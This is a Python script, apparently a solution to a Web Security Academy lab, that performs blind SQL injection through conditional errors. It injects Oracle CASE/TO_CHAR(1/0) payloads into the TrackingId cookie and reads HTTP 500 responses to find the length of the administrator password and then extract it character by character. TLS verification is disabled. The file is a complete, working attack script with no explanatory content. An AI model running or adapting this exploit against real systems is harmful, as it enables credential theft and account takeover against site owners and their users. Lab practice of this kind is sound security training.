import requests
import string
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_URL = "https://0a570018047bb6c780a1085e0059000e.web-security-academy.net/"
TIMEOUT = 10
CHARSET = string.ascii_lowercase + string.digits

session = requests.Session()

def init_cookie():
    r = session.get(BASE_URL, timeout=TIMEOUT, verify=False)
    cookies = session.cookies.get_dict()
    if "TrackingId" not in cookies:
        raise Exception("Not found TrackingId!")
    print("[+] Cookie:", cookies)
    return cookies

def send_payload(payload: str) -> bool:
    cookies = session.cookies.get_dict()
    tracking = cookies["TrackingId"] + payload
    custom_cookie = {"TrackingId": tracking, "session": cookies["session"]}
    r = session.get(BASE_URL, cookies=custom_cookie, timeout=TIMEOUT, verify=False)
    return r.status_code == 500

def get_password_length(maxlen=50):
    for length in range(1, maxlen+1):
        payload = f"' AND (SELECT CASE WHEN LENGTH(password)>{length} THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--"
        if not send_payload(payload):
            print(f"[+] Password length = {length}")
            return length
    return None

def extract_password(length: int):
    password = ""
    for pos in range(1, length+1):
        for ch in CHARSET:
            payload = f"' AND (SELECT CASE WHEN SUBSTR(password,{pos},1)='{ch}' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--"
            if send_payload(payload):
                password += ch
                print(f"[+] Found char {pos}: {ch} → {password}")
                break
    return password

if __name__ == "__main__":
    print("Blind SQLi (Conditional Error) Extractor")
    init_cookie()
    length = get_password_length()
    if not length:
        print("[-] Not found password length")
        exit()
    password = extract_password(length)
    print(f"\n[*] Administrator password: {password}")
